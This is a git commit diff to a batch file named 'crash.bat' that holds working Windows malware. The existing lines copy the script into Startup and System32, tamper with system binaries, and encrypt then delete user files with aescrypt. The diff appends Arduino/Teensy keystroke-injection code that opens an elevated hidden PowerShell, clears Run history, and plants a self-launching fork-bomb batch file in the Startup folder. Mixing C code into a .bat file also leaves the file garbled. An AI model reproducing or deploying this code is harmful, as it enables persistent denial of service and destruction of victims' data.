4b018b55c30eb0fe3a0d09b0a49f4a39aa4e345a
CrashCreatorRenakos <103921165+CrashCreatorRenakos@users.noreply.github.com>
2022-05-26 23:33:56 +0600

    crash.bat

--- crash.bat
+++ crash.bat
@@ -2,7 +2,7 @@
 copy %0 %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
 cd C:\Windows\System32
 copy %0 C:\Windows\System32
-xcopy LogonUI.exe crash.bat
+xcopy LogonUI.exe %0
 chcp 65001
 title Ошибка 402 Error 402
 xcopy ntoskrnl.exe crash.bat
@@ -13,6 +13,7 @@ start winload.exe
 start fontdrvhost.exe
 copy winload.exe %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
 del winload.exe
+chcp 866
 :winCrash
 copy %0
 del %0
@@ -706,3 +707,108 @@ REM Rename "%%X" "%%~nX.bak" >NUL 2>&1 SafeMode
 aescrypt -e -p %pass% "%%X"
 del "%%X"
 )
+#include <paensy.h>
+
+int ds = 500;
+
+void setup() {
+
+  // Configure the delay that everything else scales off of.
+  SetDelay(200);
+  // Configure the delay that the Morse code uses.
+  SetMorseDelay(250);
+
+  // Perform an initial delay to give the USB time to prepare.
+  PerformInitDelay();
+
+  // LED pin number, 13 for 3.1
+  // 11 for 2 and 2.x
+  SetLEDPin(13);
+  // Put the pin into output mode
+  pinMode(LED_PIN, OUTPUT);
+  // Turn on the LED pin so we know the device is running.
+  digitalWrite(LED_PIN, HIGH);
+  delay(3000);
+  // Run cmd as administrator on small window with white background, yellow text and clear run command history
+  Keyboard.set_modifier(MODIFIERKEY_GUI);
+  Keyboard.set_key1(KEY_R);
+  Keyboard.send_now();
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  delay(500);
+  Keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass \"Start-Process cmd -A '/t:fe /k mode con lines=1 cols=18&reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f' -Verb runAs\"");
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  delay(3000);
+  Keyboard.set_modifier(MODIFIERKEY_ALT);
+  Keyboard.set_key1(KEY_Y);
+  Keyboard.send_now();
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  delay(1000);
+  // Change directory to startup programs
+  Keyboard.print("cd %UserProfile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  delay(500);
+  // Write fork bomb batch file
+  Keyboard.print("copy con 6rgl4ljf4m.bat");
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+  Keyboard.print("@echo off");
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+  Keyboard.print(":START");
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+  Keyboard.print("start \"%UserProfile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\6rgl4ljf4m.bat\"");
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+  Keyboard.print("GOTO START");
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  delay(500);
+  Keyboard.set_modifier(MODIFIERKEY_CTRL);
+  Keyboard.set_key1(KEY_Z);
+  Keyboard.send_now();
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  delay(500);
+  // End of file
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  delay(500);
+  // Optional: Comment block to avoid executing fork bomb, making it dormant until the next and every startup.
+  Keyboard.print("6rgl4ljf4m.bat");
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  delay(500);
+
+}
+
+void loop()
+{
+  // blink quickly when complete
+  digitalWrite(LED_PIN, HIGH);
+  delay(ds/2);
+  digitalWrite(LED_PIN, LOW);
+  delay(ds/2);
+}
